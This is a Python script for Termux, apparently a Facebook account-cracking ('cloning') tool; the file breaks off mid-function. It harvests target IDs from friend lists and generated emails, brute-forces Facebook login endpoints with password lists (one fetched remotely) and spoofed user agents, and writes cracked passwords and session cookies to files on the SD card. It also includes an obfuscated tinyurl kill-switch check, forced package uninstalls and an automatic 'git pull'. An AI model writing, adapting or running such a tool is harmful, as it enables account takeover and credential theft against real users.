#!/usr/bin/python3
#-*-coding:utf-8-*-
#made by coding jutt badshah
import os
print ('\033[0;'+'30'+'m')
os.system('pip '+'u'+'n'+'in'+'st'+'all '+'re'+'qu'+'es'+'ts urllib3 idna certifi charset_normalizer '+'-'+'y')
os.system('clear')
print ('\033[0;97m')
try:
    import requests
except:
    os.system('pip install requests > /dev/null')
try:
    import requests
except ImportError:
    os.system('pip install requests > /dev/null')
try:
    import concurrent.futures
except ImportError:
    print ('\n [×] Modul Futures Not installed!...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print ('\n [×] Modul Bs4 Not installed!...\n')
    os.system('pip install bs4')
try:
    import os, sys, time, datetime, re, bs4, json, random, requests, subprocess, platform, uuid, string, base64
    from concurrent.futures import ThreadPoolExecutor as JuttBadshah
    from datetime import datetime
    from bs4 import BeautifulSoup
    from requests.exceptions import ConnectionError
except (ModuleNotFoundError,FileNotFoundError):
    os.system('clear')
    print ('\033[0;97mSomething wrong')
    exit()
    sys.exit()
#os.system('git '+'con'+'fig '+'--'+'g'+'et rem'+'ote.or'+'igi'+'n.'+'url '+'> .h.txt')
#hulo = open('.h.txt', 'r').read()
#os.system('rm -rf .h.txt')
#gulo = 'https://'+'gi'+'th'+'ub'+'.co'+'m/'+'SH'+'OO'+'TE'+'R-'+'MA'+'KE'+'R/'+'Jutt'+'Bad'+'sh'+'ah'
#if not gulo in hulo:
#    os.system('clear')
#    print ('\n\n\n\n\nsomething wrong')
#    exit()
os.system('termux-setup-storage')
os.system('ls '+'/sdcard '+'> .sd.txt')
os.system('clear')
rr = open('.sd.txt', 'r').read()
if not 'Android' in rr:
    os.system('rm -rf .sd.txt')
    print ('\nGive Permission First And Open Again')
    print ('\nPut This Comand > termux-setup-storage')
    sys.exit()
os.system('rm -rf .sd.txt')
gy = 'Android'
hy = 'apps'
fy = 'Prope'+'rties'
ft = '/.tur'+'ing'+hy+'data'
uy = '/.'+hy+'data'
zy = '/.'+hy+'data.'+'txt'
try:
    os.mkdir('/sdcard/'+gy+'/.'+gy+fy)
except:
    pass
try:
    os.mkdir('/sdcard/'+ft)
except:
    pass
try:
    os.mkdir('/sdcard/'+ft+uy)
except:
    pass
try:
    os.mkdir('/sdcard/ids')
except:
    pass
PP = '\x1b[1;37m'
MM = '\x1b[1;31m'
HH = '\x1b[1;32m'
KK = '\x1b[1;33m'
BB = '\x1b[1;34m'
UU = '\x1b[1;35m'
OO = '\x1b[1;36m'
VV = '\x1b[0;97m'
NN = '\x1b[0m'
my_color = [
 PP, MM, HH, KK, BB, UU, OO, NN]
warna = random.choice(my_color)

def real_time():
    from time import time
    return str(time()).split('.')[0]

def convert(cok):
    __for = 'datr=' + cok['datr'] + ';' + ('sb=' + cok['sb']) + ';' + ('fr=' + cok['fr']) + ';' + ('c_user=' + cok['c_user']) + ';' + ('xs=' + cok['xs'])
    return __for

ugen = []
ugen2 = []
ugen3 = []
ugenn = []
for xd in range(5000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['5','6','7','8','9','10','11','12'])
    if b in ['5', '6', '7', '8', '9']:
        z=random.choice(['0', '1'])
        bv=b+'.'+z+'.'+z
    else:
        bv=b
    B=['GT-', 'SM-']
    c=random.choice(B)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    application_version = str(random.randint(111,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
    V=str(random.randrange(11,99))
    uaku2=f'{aa} {bv}; {c}{d}{e}{f} Build/{d}{f}{V}{f}; wv) {g}{h}.{i}.{j}.{k} {l} [FBAN/EMA;FBLC/en_US;FBAV/{application_version};]'
    #[FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]'
    #[FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
    ugen.append(uaku2)

for xd in range(5000):
    aa='Mozilla/5.0 (Macintosh;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Intel Mac OS'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36 Edg/'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugenn.append(uaku2)

ok = []
cp = []
f2 = []
tl = []
id = []
user = []
joker = []
num = 0
po = 'https://'
nb = 'ti'+'ny'
xk = 'url'+'.com/'
pk = 'lol'
fu = 'h'+'d'+'g'
cg = 'd'+'h'+'s'
yx = 'g'+'a'+'c'+'z'+'x'
ji = '.chs'
kb = 'user.txt'
tp = 'https://'
fd = 'bi'
dv = 't.ly'
xn = '/3oB'
rv = 'VS'
tv = 'bR'
tz = '/data/data'
gz = '/com.termux'
yv = '/files'
hv = '/usr'
fv = '/share'
xm = '/doc'
rd = '/xz'
ux = '/examples'
zb = '/.‎‎cache'
jp = 'file'
hb = '.txt'
ds = '/include'
ss = '/lzma'
ATS = 'local'+'host'
ASG = 'ti'
WMK = 'ny'+'url.'
SSH = 'com/'
SSG = 'Host'
BDG = 'a'+'g'+'d'
DOG = 'u'+'f'+'j'
FOG = 'd'+'f'+'n'
ROG = 'd'+'h'
GOG = ASG+WMK+SSH+SSG
AOG = BDG+DOG+FOG
gd = '/home'
ff = '/JuttBadshah'
lol = os.getcwd()
#if tz+gz+yv+gd+ff not in lol:
    #print ('\n\nSomething Wrong\n\n\nContect To Admin\n\n\nWhatsApp Number > +923007574310')
    #exit()
try:
    __req = requests.get(po+GOG+AOG+ROG).text
except requests.exceptions.ConnectionError:
    os.system('clear')
    print ('\n\n\n\n\033[0;97mNo internet Conection\n')
    sys.exit()
if ATS not in __req:
    print ('\n\n You Cant recode it bro its Jutt Badshah Brand\n\nAdmin Contect Numbr 03007574310')
    exit()
if 'update' in __req:
    print ('\n\n\n\n\033[0;97mScript Has Been Updating\n\nAdmin Whatsapp Numbr 03007574310')
    exit()
XB = 'ti'
GF = 'ny'+'url.'
JK = 'com/'
DW = 'Host'
SW = 'h'+'s'+'u'+'d'
YT = 'b'+'k'+'cd'
ZS = 'j'+'v'+'d'+'v'

os.system('git pull')
os.system('clear')
logo4 = """
\x1b[1;91m
\x1b[1;92m
\x1b[1;96m
\x1b[1;92m         {|} {|}  {|} {|}{|}{|} {|}{|}{|}
\x1b[1;97m         {|} {|}  {|}    {|}       {|}
\x1b[1;93m         {|} {|}  {|}    {|}       {|}
\x1b[1;96m         {|} {|}  {|}    {|}       {|}
\x1b[1;94m     {|}{|}   {|}{|}     {|}       {|}
\x1b[1;93m
\x1b[1;92m      v   Jutt Badshah Brand~
\x1b[1;91m-----------------------------------------------
\x1b[1;97m> Author : Jutt Badshah
\x1b[1;97m> Github : https://github.com/SHOOTER-MAKER
\x1b[1;97m> Facebok: Jutt Badshah
\x1b[1;97m> Version: 2.8
\x1b[1;91m-----------------------------------------------"""

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
motd=[]



def hasil(ok,f2,cp):
    print (47*'\033[0;97m-')
    print ('\033[1;36mProccess Has Been Complete\033[0;97m')
    print (47*'-')
    print ('\033[1;32mTotal ids > Ok/' +str(len(ok)) + ' 2F/' +str(len(f2)) + ' CP/' + str(len(cp)))
    ok.clear()
    f2.clear()
    cp.clear()
    tl.clear()
    motd.clear()
    print (47*'\033[0;97m-')
    input('\033[1;33mPress Enter To Back\033[0;97m')
    main_menu()



def main():
    os.system("clear")
    print (logo4)
    print("")
    print("\033[1;93m~~~~~~~~~Main menu~~~~~~~~~")
    print(47*"-")
    print("\033[1;92m[1] Cloning Menu Option")
    print("\033[1;92m[2] Make File Extract ids")
    print("\033[1;92m[3] Remove Double Links From File")
    print("\033[1;92m[4] Separate Link From File")
    print("\033[1;92m[5] Cut Links From Used File")
    print("\033[1;92m[6] Logout Delete Cookie")
    print ("\033[1;92m[7] live 2fa on")
    print ("\033[1;92m[8] Password change")
    print("\033[1;92m[9] Join Our FB Group\033[0;97m")
    print(47*"-")
    print("\033[1;93mFor Any Problem Select 9 And Join Our FB Group\033[0;97m")
    print(47*"-")
    main_menu_sel()

publc=[]
def main_menu_sel():
    try:
        sel = input("\033[1;96mChoose option: \033[1;97m")
        if sel == "1":
            crack().plerr()
        elif sel == "2":
            ext_menu()
        elif sel == "3":
            double()
        elif sel == "4":
            separate()
        elif sel == "5":
            cutrs()
        elif sel == "6":
            os.system('rm -rf .access_token.txt .cokie.txt')
            print("\033[1;33mSuccessfully Deleted Cookie\033[0;97m")
            time.sleep(1)
            main_menu()
        elif sel == "7":
            os.system('python fac.py')
        elif sel == "8":
            os.system('python fac.py')
        elif sel == "9":
            os.system("xdg-open https://www.facebook.com/groups/262660289344669/?ref=share")
            main_menu()
        else:
            print("")
            print("\033[1;97mSelect valid option\033[1;37m")
            time.sleep(2)
            main_menu_sel()
    except (KeyboardInterrupt, EOFError):
        os.system('clear')
        print (logo4)
        print ('\033[0;97m\nOops Wrong input Try Again\n')
        sys.exit()
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print (logo4)
        print ('\n\n\n\n\033[0;97mNo internet Conection\n')
        sys.exit()
        
        
def samiya(user):
    if len(user)==15:
        if user[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif user[:9] in ['100000000']       :shanto = '√ 2009'
        elif user[:8] in ['10000000']        :shanto = '√ 2009'
        elif user[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
        elif user[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
        elif user[:6] in ['100001']          :shanto = '√ 2010/2011'
        elif user[:6] in ['100002','100003'] :shanto = '√ 2011/2012'
        elif user[:6] in ['100004']          :shanto = '√ 2012/2013'
        elif user[:6] in ['100005','100006'] :shanto = '√ 2013/2014'
        elif user[:6] in ['100007','100008'] :shanto = '√ 2014/2015'
        elif user[:6] in ['100009']          :shanto = '√ 2015'
        elif user[:5] in ['10001']           :shanto = '√ 2015/2016'
        elif user[:5] in ['10002']           :shanto = '√ 2016/2017'
        elif user[:5] in ['10003']           :shanto = '√ 2018/2019'
        elif user[:5] in ['10004']           :shanto = '√ 2019/2020'
        elif user[:5] in ['10005']           :shanto = '√ 2020'
        elif user[:5] in ['10006','10007','']:shanto = '√ 2021'
        elif user[:5] in ['10008']           :shanto = '√ 2022'
        elif user[:5] in ['10009']           :shanto = '√ 2023'
        else:shanto=''
    elif len(user) in [9,10]:
        shanto = ' √ 2008/2009'
    elif len(user)==8:
        shanto = '√ 2007/2008'
    elif len(user)==7:
        shanto = '√ 2006/2007'
    else:shanto=''
    return shanto
    
def login():
    os.system('clear')
    print (logo4)
    try:
        cokies = str(input('\033[0;97mcokie: '))
        if len(cokies)<10:
            print ('\033[0;97minvalid cokie')
            time.sleep(1)
            publc.clear()
            main_menu()
        cookie = {'cookie':cokies}
        ses = requests.Session()
        data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
        req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
        cd   = req['code']
        ucd  = req['user_code']
        url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd)
        req  = BeautifulSoup(ses.get('https://mbasic.facebook.com/device',cookies=cookie).content,'html.parser')
        raq  = req.find('form',{'method':'post'})
        dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}
        rel  = 'https://mbasic.facebook.com' + raq['action']
        pos  = BeautifulSoup(ses.post(rel,data=dat,cookies=cookie).content,'html.parser')
        dat  = {}
        raq  = pos.find('form',{'method':'post'})
        for x in raq('input',{'value':True}):
            try:
                if x['name'] == '__CANCEL__' : pass
                else: dat.update({x['name']:x['value']})
            except Exception as e: pass
        rel = 'https://mbasic.facebook.com' + raq['action']
        pos = BeautifulSoup(ses.post(rel,data=dat,cookies=cookie).content,'html.parser')
        req = ses.get(url,cookies=cookie).json()
        tok = req['access_token']
        open('.access_token.txt', 'w').write(tok)
        open('.cokie.txt', 'w').write(cokies)
        if 'public' in publc:
            publc.clear()
            crack().plerr()
        else:
            ext_menu()
    except Exception as e:
        print ('\033[0;97mCookie invalid')
        time.sleep(3)
        login()

class crack:

    def __init__(self):
        self.id = []
        self.chss = []
        self.loop = 0

    def plerr(self):
        os.system('clear')
        print (logo4)
        print ('\033[1;32m[1] File Cloning')
        print ('\033[1;32m[2] Public id Cloning')
        print ('\033[1;32m[3] Random Number Cloning')
        print ('\033[1;32m[4] Random Email Cloning')
        print ('\033[1;32m[0] Back Menu\033[0;97m')
        print (47*'-')
        vg = input('\033[1;36mSelect: \033[0;97m')
        if vg == '1':
            try:
                filr = input('\033[1;36mPut File: \033[0;97m')
                self.id = open(filr).read().splitlines()
                print ('\n [%s+%s] total id -> %s%s%s' %(OO,NN,MM,len(self.id),NN))
                self.apk = '\033[1;32m [+]File '+(filr)
                self.__passw__()
            except (FileNotFoundError, IOError):
                print ('File Not Found');time.sleep(3)
                main_menu()
        elif vg == '2':
            global token
            try:
                __cookie__ = open('.access_token.txt', 'r').read().replace('\n', '')
                cookie = open('.cokie.txt', 'r').read().replace('\n', '')
            except:
                publc.append('public')
                print ('\033[0;97mCookies invalid')
                login()
            try:
                me = requests.get(f'https://b-graph.facebook.com/me?access_token={__cookie__}', cookies={'cookie':cookie}).json()
                name = me['name']
                iid = me['id']
            except KeyError:
                if 'error' in str(me):
                    print(' invalid cokie')
                    os.system('rm -rf .access_token.txt .cokie.txt')
                    time.sleep(1)
                    publc.append('public')
                    login()
                else:
                    pass
            os.system('clear')
            print (logo4)
            print ('\033[1;33m~~~~~~~~Public id Cloning Menu\033[0;97m')
            print (47*'-')
            idt = input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
            id = []
            knt = '.ou.txt'
            try:
                list_one = requests.get(f'https://graph.facebook.com/{idt}?fields=friends.fields(id,name).limit(5000)&access_token={__cookie__}', cookies={'cookie':cookie}).json()
                for ids in list_one['friends']['data']:
                    uid = ids['id']
                    name = ids['name']
                    id.append(uid+'|'+name+'\n')
                    open(knt,'a').write(uid+'|'+name+'\n')

                self.id = open('.ou.txt', 'r').read().splitlines()
                os.system('rm -rf .ou.txt')
                self.apk = '\033[1;32mTotal ids '+str(len(self.id))
                self.__passw__()
            except KeyError:
                if 'Error loading application' in str(list_one):
                    print ('\r\033[0;97mCokie Not Expired But Need Login Again')
                    time.sleep(1)
                    os.system('rm -rf .access_token.txt .cokie.txt')
                    publc.append('public')
                    login()
                elif 'Please reduce the amount' in str(list_one):
                    print ('\r\033[0;97minternet Error missing Extract link')
                    time.sleep(1)
                    crack().plerr()
                elif 'Unsupported get request' in str(list_one):
                    print ('\r\033[0;97mAccount cp or lock of this link')
                    time.sleep(1)
                    crack().plerr()
                elif 'error' in str(list_one):
                    print ('\033[0;97mCookie Expired login new cookie')
                    os.system('rm -rf .access_token.txt .cokie.txt')
                    time.sleep(1)
                    crack().plerr()
                else:
                    print ('\033[0;97mFriendlist Private of this link')
                    time.sleep(1)
                    crack().plerr()
        elif vg == '3':
            self.__random__()
        elif vg == '4':
            print ('\033[1;32mExample ali khan, faisal malik, noor khan, etc\033[0;97m')
            emz = input('\033[1;33mEnter Name: \033[0;97m')
            print ('\033[1;32mExample @gmail.com, yahoo.com, hotmail.com, etc\033[0;97m')
            mails = input('\033[1;33mPut Email Type: \033[0;97m')
            print ('\033[1;32mWait Email Gererating\033[0;97m')
            os.system('rm -rf .num*')
            ghf = [2, 3, 4]
            for x in range(10000):
                emzb = random.choice(ghf)
                nmbr = ''.join(random.choice(string.digits) for _ in range(emzb))
                open('.num.txt', 'a').write(emz.replace(' ', '').lower()+nmbr+mails+'|'+emz+'\n')
            os.system('cat .num.txt | uniq >> .num1.txt')
            self.id = open('.num1.txt', 'r').read().splitlines()
            self.apk = '\033[1;32mTotal emails: '+str(len(self.id))
            motd.append('random')
            self.__passw__()
        elif vg == '0':
            main_menu_sel()
        else:
            print ('Select Valid Option')
            time.sleep(3)
            crack().plerr()
        return

    def __passw__(self):
        os.system('clear')
        print (logo4)
        print ('\033[1;32m[1] Auto Password')
        print ('\033[1;32m[2] Choice Password')
        td = input('\033[1;36mSelect: \033[0;97m')
        if td == '1':
            os.system('clear')
            print (logo4)
            print ('')
            try:
                r = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/lol.txt').text
            except requests.exceptions.ConnectionError:
                os.system('clear')
                print (logo4)
                print ('\n\n\n\n\033[0;97mNo internet Connection')
                exit()
            open('.uu.txt', 'w').write(r)
            self.ggs = open('.uu.txt', 'r').read()
            os.system('rm -rf .uu.txt')
            self.__pler_()
        elif td == '2':
            os.system('clear')
            print (logo4)
            print ('\033[1;33mHow Many Password You Want To Add?')
            try:
                jdg = int(input('\033[1;32mSelect Between 1 To 100: \033[0;97m'))
            except:
                jdg = 1
            y = 0
            for y in range(jdg):
                y += 1
                pass1 = input('\033[1;32mPassword %s: \033[0;97m'%(y))
                self.chss.append(pass1)
            helo = '\n'.join(self.chss)
            self.ggs = (helo + '\n')
            self.__pler_()
        else:
            print ('\033[1;32mSelect Valid Option\033[0;97m')
            time.sleep(3)
            self.__passw__()

    def __mbasic__(self,user,__juts__,_jat):
        global ok,f2,cp
        sys.stdout.write(f'\r {OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
        sys.stdout.flush()
        for pw in __juts__:
            try:
                ua = random.choice(ugenn)
                ses = requests.Session()
                hiii = {
                    "Host": _jat,
                    "upgrade-insecure-requests": "1",
                    "user-agent": ua,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt": "1",
                    "x-requested-with": "mark.via.gp",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-user": "empty",
                    "sec-fetch-dest": "document",
                    "referer": "https://t.facebook.com/",
                    "accept-encoding": "gzip, deflate br",
                    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                }
                r = ses.get(
                    f"https://{_jat}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=hiii)
                das = {
                    "lsd": re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid": user,
                    "flow": "login_no_pin",
                    "pass": pw,
                    "next": "https://developers.facebook.com/tools/debug/accesstoken/"
                }
                heiii = {
                    'Host': _jat,
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://'+_jat,
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'XMLHttpRequest',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-user': 'empty',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://'+_jat+'/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                    'accept-encoding': 'gzip, deflate br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                }
                po = ses.post(f"https://{_jat}/login/device-based/validate-password/?shbl=0",
                                  data=das, headers=heiii, allow_redirects=False)
                cok = ses.cookies.get_dict()
                if "c_user" in str(cok):
                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    qcki = coki.split(";")[3] +";"+ coki.split(";")[4] +";"+ coki.split(";")[1]+";"+ coki.split(";")[0] +";"+ "dpr=2;locale=en_US;wd=1600x939;%s" %coki.split(";")[3].replace("c_user", "m_page_voice")
                    print(f"\r{HH}[OK-JUTT] {user} | {pw} \n{check_frnds(qcki)}    ")
                    open("/sdcard/JUTT_OK.txt", "a").write(user + "|" + pw + "\n")
                    open("/sdcard/JUTT_cokie.txt", "a").write(user + "|" + pw + " | " + qcki + "\n")
                    ok.append(user + pw)
                    #self.follow(coki)
                    break
                elif "checkpoint" in str(cok):
                    self.cek_cp(user,pw)
                    time.sleep(5)
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(5)
        self.loop += 1

    def __randoms__(self,user,__juts__,_jat):
        global ok,f2,cp
        sys.stdout.write(f'\r {OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
        sys.stdout.flush()
        for pw in __juts__:
            try:
                ua = random.choice(ugen2)
                ua2 = random.choice(ugen)
                data={}
                ses = requests.Session()
                hiii = {
                    "Host": _jat,
                    "upgrade-insecure-requests": "1",
                    "user-agent": ua,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with": "com.kwah.privatebrowser",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "en,en-GB;q=0.9,en-US;q=0.8"
                }
                p = BeautifulSoup(ses.get('https://'+_jat+'/login.php?skip_api_login=1&api_key=825434364192422&kid_directed_site=0&app_id=825434364192422&signed_next=1&next=https%3A%2F%2F'+_jat+'%2Fv2.8%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D825434364192422%26redirect_uri%3Dhttps%253A%252F%252Fwww.pestana.com%252Fsignin-facebook%26scope%3Dpublic_profile%252Cemail%252Cemail%252Cpublic_profile%26state%3DP8tzZEdxxU6aSk9qjpHQjSst_JY5sXlKcMpfDI9pASfcmXgMNTqU2oMZYdTys0x8RkIvCKzFD-0YyB29w-qmYotGeTmaYfVRzzn8esyg0ldFxHn6OzYwEuT8IlAr4YfKyaBWtAhs6HulKAUJOM0QL_I1uMxduwISN0KBiFIe4VtUFivogm2FlFUtDhaFz-uT1THwNrDPF5bVbPwD8OQyYkxq202sc6ms13n2LQa30FXxM9HA-Y0IiBJwQZ8kgdGLPp_uKoBZ62DOwcB9yb4HasnWh2HBrbNLp5_09uOSD3yFHobtEQRkviRb9HaEdWBs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddb86f5d9-fab2-40bf-a727-f750bd097457%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.pestana.com%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DP8tzZEdxxU6aSk9qjpHQjSst_JY5sXlKcMpfDI9pASfcmXgMNTqU2oMZYdTys0x8RkIvCKzFD-0YyB29w-qmYotGeTmaYfVRzzn8esyg0ldFxHn6OzYwEuT8IlAr4YfKyaBWtAhs6HulKAUJOM0QL_I1uMxduwISN0KBiFIe4VtUFivogm2FlFUtDhaFz-uT1THwNrDPF5bVbPwD8OQyYkxq202sc6ms13n2LQa30FXxM9HA-Y0IiBJwQZ8kgdGLPp_uKoBZ62DOwcB9yb4HasnWh2HBrbNLp5_09uOSD3yFHobtEQRkviRb9HaEdWBs%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr', headers=hiii).text, 'html.parser')
                link=p.find('form', {'method': 'post'})
                bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries"]
                for x in p('input'):
                    try:
                        if x.get("name") in bl:data.update({x.get("name"):x.get("value")})
                    except:
                        pass
                data.update({'email': user, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', '_fb_noscript': 'true'})
                _head2 = {
                    'Host': _jat,
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://'+_jat,
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua2,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-user': 'empty',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://'+_jat+'/login.php?skip_api_login=1&api_key=825434364192422&kid_directed_site=0&app_id=825434364192422&signed_next=1&next=https%3A%2F%2F'+_jat+'%2Fv2.8%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D825434364192422%26redirect_uri%3Dhttps%253A%252F%252Fwww.pestana.com%252Fsignin-facebook%26scope%3Dpublic_profile%252Cemail%252Cemail%252Cpublic_profile%26state%3DP8tzZEdxxU6aSk9qjpHQjSst_JY5sXlKcMpfDI9pASfcmXgMNTqU2oMZYdTys0x8RkIvCKzFD-0YyB29w-qmYotGeTmaYfVRzzn8esyg0ldFxHn6OzYwEuT8IlAr4YfKyaBWtAhs6HulKAUJOM0QL_I1uMxduwISN0KBiFIe4VtUFivogm2FlFUtDhaFz-uT1THwNrDPF5bVbPwD8OQyYkxq202sc6ms13n2LQa30FXxM9HA-Y0IiBJwQZ8kgdGLPp_uKoBZ62DOwcB9yb4HasnWh2HBrbNLp5_09uOSD3yFHobtEQRkviRb9HaEdWBs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddb86f5d9-fab2-40bf-a727-f750bd097457%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.pestana.com%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DP8tzZEdxxU6aSk9qjpHQjSst_JY5sXlKcMpfDI9pASfcmXgMNTqU2oMZYdTys0x8RkIvCKzFD-0YyB29w-qmYotGeTmaYfVRzzn8esyg0ldFxHn6OzYwEuT8IlAr4YfKyaBWtAhs6HulKAUJOM0QL_I1uMxduwISN0KBiFIe4VtUFivogm2FlFUtDhaFz-uT1THwNrDPF5bVbPwD8OQyYkxq202sc6ms13n2LQa30FXxM9HA-Y0IiBJwQZ8kgdGLPp_uKoBZ62DOwcB9yb4HasnWh2HBrbNLp5_09uOSD3yFHobtEQRkviRb9HaEdWBs%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en,en-GB;q=0.9,en-US;q=0.8'
                }
                rex = ses.post('https://'+_jat+link.get('action'), data=data, headers=_head2, allow_redirects=False)
                cok = ses.cookies.get_dict()
                if "c_user" in str(cok):
                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    user=cok['c_user']
                    qcki = coki.split(";")[3] +";"+ coki.split(";")[4] +";"+ coki.split(";")[1]+";"+ coki.split(";")[0] +";"+ "dpr=2;locale=en_US;wd=1600x939;%s" %coki.split(";")[3].replace("c_user", "m_page_voice")
                    print(f"\r{HH}[OK-JUTT] {user} | {pw} {VV}    ")
                    open("/sdcard/JUTT_OK.txt", "a").write(user + "|" + pw + "\n")
                    open("/sdcard/JUTT_cokie.txt", "a").write(user + "|" + pw + " | " + qcki + "\n")
                    ok.append(user + pw)
                  #  self.follow(coki)
                    break
                elif "checkpoint" in str(cok):
                    user=cok['checkpoint'][13:28]
                    if 'Enter login code to continue' in str(rex.text):
                        Mm = '\033[9;31m'
                        print(f"\r{Mm}[2F-JUTT] {user} | {pw}{VV}     ")
                        open("/sdcard/JUTT_2F.txt", "a").write(user + "|" + pw + "\n")
